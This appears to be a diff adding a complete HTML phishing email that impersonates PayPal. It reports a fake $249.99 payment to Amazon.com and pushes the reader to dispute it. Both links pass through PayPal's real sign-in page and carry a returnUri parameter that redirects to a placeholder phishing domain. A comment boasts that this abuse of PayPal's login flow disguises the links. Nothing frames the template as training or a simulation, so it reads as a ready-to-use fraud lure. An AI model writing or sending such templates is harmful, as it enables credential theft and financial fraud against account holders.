@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal Payment Received</title>
+  <style>
+    body { font-family: Helvetica, Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
+    .container { max-width: 600px; margin: auto; background: white; border: 1px solid #e0e0e0; }
+    .header { background: #003087; padding: 20px; text-align: center; }
+    .header img { height: 30px; }
+    .content { padding: 25px; }
+    .invoice { background: #f9f9f9; padding: 15px; margin: 20px 0; border-left: 4px solid #0070ba; }
+    .btn { display: inline-block; background: #ffc439; color: #003087; text-decoration: none; padding: 12px 24px; font-weight: bold; border-radius: 4px; }
+    .footer { padding: 15px; font-size: 11px; color: #666; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal_logo_2014.svg" alt="PayPal">
+    </div>
+    <div class="content">
+      <h2>Payment Received</h2>
+      <p>Hello,</p>
+      <p>A payment of <strong>$249.99</strong> was sent to <strong>Amazon.com</strong> from your PayPal account.</p>
+
+      <div class="invoice">
+        <p><strong>Transaction ID:</strong> 9XN728461K</p>
+        <p><strong>Date:</strong> November 2, 2025</p>
+        <p><strong>Status:</strong> Completed</p>
+      </div>
+
+      <p>If you did not authorize this transaction, <a href="https://www.paypal.com/signin?returnUri=https://your-phishing-domain.com/paypal-dispute">click here to report it</a>.</p>
+
+      <!-- Obfuscated via PayPal's own login flow -->
+      <a href="https://www.paypal.com/signin?returnUri=https://your-phishing-domain.com/paypal-login" class="btn">View Transaction Details</a>
+    </div>
+    <div class="footer">
+      PayPal is committed to your security. Never share your password.<br>
+      © 2025 PayPal. All rights reserved.
+    </div>
+  </div>
+</body>
+</html>
